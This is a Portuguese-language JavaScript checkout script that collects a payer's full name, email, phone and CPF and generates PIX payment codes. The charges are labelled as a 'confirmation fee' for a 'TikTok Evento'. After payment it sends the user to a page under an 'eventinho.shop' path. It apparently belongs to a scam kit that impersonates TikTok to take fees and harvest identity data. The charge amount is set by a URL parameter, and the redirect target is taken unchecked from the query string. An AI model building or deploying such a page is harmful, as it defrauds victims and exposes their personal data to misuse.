// Funções auxiliares
function formatCurrency(value) {
    return new Intl.NumberFormat('pt-BR', {
        style: 'currency',
        currency: 'BRL'
    }).format(value);
}

function formatCPF(value) {
    value = value.replace(/\D/g, '');
    if (value.length <= 11) {
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d)/, '$1.$2');
        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    }
    return value;
}

function formatPhone(value) {
    value = value.replace(/\D/g, '');
    if (value.length <= 11) {
        value = value.replace(/(\d{2})(\d)/, '($1) $2');
        value = value.replace(/(\d{5})(\d)/, '$1-$2');
    }
    return value;
}

// Extrai valor da URL ou usa valor padrão
function getCheckoutValue() {
    const urlParams = new URLSearchParams(window.location.search);
    const valueParam = urlParams.get('valor') || urlParams.get('value') || urlParams.get('amount');
    
    if (valueParam) {
        // Remove formatação e converte para número
        const numericValue = parseFloat(valueParam.replace(/[^\d,.-]/g, '').replace(',', '.'));
        if (!isNaN(numericValue) && numericValue > 0) {
            return numericValue;
        }
    }
    
    // Valor padrão
    return 21.67;
}

// Inicialização
document.addEventListener('DOMContentLoaded', function() {
    const checkoutForm = document.getElementById('checkout-form');
    const submitBtn = document.getElementById('submit-btn');
    const pixArea = document.getElementById('pix-area');
    const copyPixBtn = document.getElementById('copy-pix-btn');
    const pixCodeInput = document.getElementById('pix-code');
    
    // Obtém o valor do checkout
    const checkoutValue = getCheckoutValue();
    
    // Atualiza os valores na interface
    document.getElementById('order-total').textContent = formatCurrency(checkoutValue);
    document.getElementById('final-total').textContent = formatCurrency(checkoutValue);
    document.getElementById('pix-amount').textContent = formatCurrency(checkoutValue);
    
    // Formatação de inputs
    const documentInput = document.getElementById('document');
    const phoneInput = document.getElementById('phone');
    
    documentInput.addEventListener('input', function(e) {
        e.target.value = formatCPF(e.target.value);
    });
    
    phoneInput.addEventListener('input', function(e) {
        e.target.value = formatPhone(e.target.value);
    });
    
    // Handler do formulário
    checkoutForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Desabilita o botão
        submitBtn.disabled = true;
        submitBtn.innerHTML = '<span>Processando...</span>';
        
        // Coleta os dados do formulário
        const formData = {
            fullName: document.getElementById('fullName').value.trim(),
            email: document.getElementById('email').value.trim(),
            phone: document.getElementById('phone').value.trim(),
            document: document.getElementById('document').value.trim(),
            amount: checkoutValue
        };
        
        // Validação básica
        if (!formData.fullName || !formData.email || !formData.phone || !formData.document) {
            alert('Por favor, preencha todos os campos obrigatórios.');
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<span>GERAR PIX E FINALIZAR</span>';
            return;
        }
        
        // Valida CPF (básico)
        const cleanCPF = formData.document.replace(/\D/g, '');
        if (cleanCPF.length !== 11) {
            alert('Por favor, insira um CPF válido.');
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<span>GERAR PIX E FINALIZAR</span>';
            return;
        }
        
        try {
            // Prepara dados para a API
            const paymentData = {
                amount: checkoutValue,
                description: 'Taxa de confirmação - TikTok Evento',
                customer: {
                    name: formData.fullName,
                    document: cleanCPF,
                    phone: formData.phone.replace(/\D/g, ''),
                    email: formData.email
                },
                item: {
                    title: 'Taxa de confirmação',
                    price: checkoutValue,
                    quantity: 1
                },
                utm: new URLSearchParams(window.location.search).toString()
            };
            
            // Cria o pagamento PIX
            const pixResponse = await window.PixupAPI.createPixPayment(paymentData);
            
            // Verifica se temos o código PIX
            if (pixResponse.pixCode || pixResponse.payment?.metadata?.pixCode) {
                const pixCode = pixResponse.pixCode || pixResponse.payment.metadata.pixCode;
                
                // Atualiza a interface
                pixCodeInput.value = pixCode;
                
                // Se tiver QR Code
                if (pixResponse.payment?.metadata?.pixQrCode) {
                    const qrContainer = document.getElementById('pix-qr-container');
                    qrContainer.innerHTML = `<img src="${pixResponse.payment.metadata.pixQrCode}" alt="QR Code PIX">`;
                } else {
                    // Gera QR Code usando API externa
                    const qrContainer = document.getElementById('pix-qr-container');
                    qrContainer.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}" alt="QR Code PIX">`;
                }
                
                // Mostra a área do PIX
                pixArea.style.display = 'block';
                checkoutForm.style.display = 'none';
                
                // Scroll para a área do PIX
                pixArea.scrollIntoView({ behavior: 'smooth', block: 'start' });
                
                // Inicia verificação de status
                if (pixResponse.payment?.id || pixResponse.transactionId) {
                    const paymentId = pixResponse.payment?.id || pixResponse.transactionId;
                    startPaymentStatusCheck(paymentId);
                }
                
                // Inicia timer
                startTimer(30 * 60); // 30 minutos
            } else {
                throw new Error('Código PIX não retornado pela API');
            }
            
        } catch (error) {
            console.error('Erro ao processar pagamento:', error);
            alert('Erro ao gerar código PIX. Por favor, tente novamente.\n\n' + error.message);
            submitBtn.disabled = false;
            submitBtn.innerHTML = '<span>GERAR PIX E FINALIZAR</span>';
        }
    });
    
    // Handler do botão copiar
    copyPixBtn.addEventListener('click', function() {
        pixCodeInput.select();
        pixCodeInput.setSelectionRange(0, 99999); // Para mobile
        
        try {
            document.execCommand('copy');
            copyPixBtn.innerHTML = '<span>✓ Copiado!</span>';
            copyPixBtn.classList.add('copied');
            
            setTimeout(() => {
                copyPixBtn.innerHTML = '<span>Copiar</span>';
                copyPixBtn.classList.remove('copied');
            }, 2000);
        } catch (err) {
            // Fallback para navegadores modernos
            navigator.clipboard.writeText(pixCodeInput.value).then(() => {
                copyPixBtn.innerHTML = '<span>✓ Copiado!</span>';
                copyPixBtn.classList.add('copied');
                
                setTimeout(() => {
                    copyPixBtn.innerHTML = '<span>Copiar</span>';
                    copyPixBtn.classList.remove('copied');
                }, 2000);
            });
        }
    });
});

// Função para verificar status do pagamento
let statusCheckInterval = null;

function startPaymentStatusCheck(paymentId) {
    // Verifica a cada 5 segundos
    statusCheckInterval = setInterval(async () => {
        try {
            const status = await window.PixupAPI.verifyPaymentStatus(paymentId);
            
            const statusElement = document.getElementById('pix-status');
            
            if (status.status === 'completed' || status.status === 'paid') {
                statusElement.textContent = 'Pagamento confirmado!';
                statusElement.style.color = '#28a745';
                
                // Para a verificação
                if (statusCheckInterval) {
                    clearInterval(statusCheckInterval);
                }
                
                // Redireciona após 2 segundos
                setTimeout(() => {
                    // Pega URL de retorno da query string ou usa padrão
                    const urlParams = new URLSearchParams(window.location.search);
                    const returnUrl = urlParams.get('return') || urlParams.get('redirect') || '../tik tok evento/bemvindoaoeventinho.shop/ap/index.html';
                    window.location.href = returnUrl;
                }, 2000);
            } else if (status.status === 'pending' || status.status === 'waiting_payment') {
                statusElement.textContent = 'Aguardando pagamento';
                statusElement.style.color = '#ffc107';
            }
        } catch (error) {
            console.error('Erro ao verificar status:', error);
        }
    }, 5000);
}

// Função para timer
function startTimer(seconds) {
    const timerElement = document.getElementById('timer');
    let remaining = seconds;
    
    const interval = setInterval(() => {
        const minutes = Math.floor(remaining / 60);
        const secs = remaining % 60;
        
        timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
        
        if (remaining <= 0) {
            clearInterval(interval);
            timerElement.textContent = 'Expirado';
            alert('O código PIX expirou. Por favor, gere um novo código.');
        }
        
        remaining--;
    }, 1000);
}

